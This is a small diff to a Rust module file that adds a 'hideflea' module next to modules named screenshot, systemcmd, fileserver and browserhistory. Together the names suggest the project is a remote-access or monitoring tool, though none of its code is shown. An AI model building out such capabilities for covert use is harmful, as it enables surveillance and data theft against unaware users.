@@ -7,6 +7,7 @@ pub mod screenshot;
 pub mod systemcmd;
 pub mod fileserver;
 pub mod browserhistory;
+pub mod hideflea;
 
 #[cfg(target_os = "windows")]
 pub mod windowsfunctions;
